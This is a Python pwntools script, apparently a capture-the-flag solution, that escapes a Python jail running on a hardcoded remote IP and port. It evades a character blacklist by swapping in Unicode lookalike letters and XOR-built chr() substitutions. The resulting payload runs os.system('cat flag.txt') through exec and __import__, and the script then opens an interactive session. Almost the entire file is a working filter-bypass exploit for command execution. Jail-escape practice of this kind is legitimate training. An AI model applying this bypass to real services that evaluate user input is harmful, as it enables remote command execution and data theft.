import string
from functools import reduce
from itertools import permutations

from pwn import *

blacklist_char = [
    ";",
    '"',
    "os",
    "_",
    "\\",
    "/",
    "`",
    " ",
    "-",
    "!",
    "[",
    "]",
    "*",
    "%",
    "&",
    ">",
    "<",
    "+",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "b",
    "s",
    "}",
    "{",
]

list_char = string.ascii_letters + string.digits + string.punctuation

# nc 94.237.58.224 48380
HOST = "94.237.58.224"
PORT = 48380

io = remote(HOST, PORT)

fake_alphabet = "𝔞 𝔟 𝔠 𝔡 𝔢 𝔣 𝔤 𝔥 𝔦 𝔧 𝔨 𝔩 𝔪 𝔫 𝔬 𝔭 𝔮 𝔯 𝔰 𝔱 𝔲 𝔳 𝔴 𝔵 𝔶 𝔷".split(" ")
real_alphabet = "a b c d e f g h i j k l m n o p q r s t u v w x y z".split(" ")
real_to_fake = {real: fake for real, fake in zip(real_alphabet, fake_alphabet)}


def convert(s, replace=["b", "s"]):
    return "".join(real_to_fake.get(c, c) if c in replace else c for c in s)


def string_bypassers(
    s, char_to_bypass, unused_char, blacklist_char=blacklist_char, convert=convert
):
    assert all([c not in blacklist_char for c in unused_char])
    combination = []
    for ctb in char_to_bypass:
        tcomb = []
        i = 1
        while tcomb == []:
            for x in permutations(list_char, i):
                temp = reduce(lambda x, y: x ^ y, map(lambda x: ord(x), x))
                temp = chr(temp ^ ord(ctb))
                if (
                    all([a not in blacklist_char for a in x])
                    and temp not in blacklist_char
                    and temp in list_char
                ):
                    tcomb = list(x) + [temp]
            i += 1
        combination.append(tcomb)

    replacer = []
    for comb in combination:
        temp = ""
        for i, c in enumerate(comb):
            if i != 0:
                temp += "^"
            temp += convert("ord('{}')").format(c)
        replacer.append(temp)

    res = "'{}'"
    for ctb, uc in zip(char_to_bypass, unused_char):
        s = s.replace(ctb, uc)
    res = convert(res.format(s))

    for uc, r in zip(unused_char, replacer):
        res += convert(".replace('{}',chr({}))").format(uc, r)

    return res


# payload = "exec({})"
# payload = convert(payload).format(
#     string_bypassers(
#         "__builtins__.__import__('os').system('ls')",
#         ["_", "'", "o", "s"],
#         ["?", "$", "#", "@"],
#         convert=lambda x: convert(x, replace=["b"]),
#     )
# )

payload = "exec({})"
payload = convert(payload).format(
    string_bypassers(
        "__builtins__.__import__('os').system('cat flag.txt')",
        ["_", "'", "o", " ", "s", "b", "c"],
        ["?", "$", "#", "@", "~", "|", ":"],
        convert=lambda x: convert(x, replace=[]),
    )
)

print(payload)

io.sendline(payload.encode())
io.interactive()
